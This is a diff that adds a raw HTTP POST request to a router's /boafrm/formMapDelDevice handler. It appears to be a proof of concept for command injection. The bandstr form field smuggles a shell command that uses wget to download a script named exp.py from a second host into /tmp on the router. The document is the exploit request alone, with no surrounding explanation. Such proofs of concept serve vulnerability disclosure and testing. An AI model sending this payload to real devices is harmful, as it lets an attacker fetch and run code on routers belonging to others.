@@ -1,0 +1,31 @@
+POST /boafrm/formMapDelDevice HTTP/1.1
+
+Host: 192.168.0.1
+
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 135
+
+Origin: http://192.168.0.1
+
+DNT: 1
+
+Connection: close
+
+Referer: http://192.168.0.1/portfw.htm
+
+Cookie: webuicookie=1p4p24OHykTbddjR91Y87BPB
+
+Upgrade-Insecure-Requests: 1
+
+
+
+sessionCheck=45b0c55d99791351e9646659b4ac70f1&macstr=a&bandstr=b;wget%20-P%2ftmp%2f%20192.168.0.2:8888%2fexp.py&clientoff=1&submit-url=
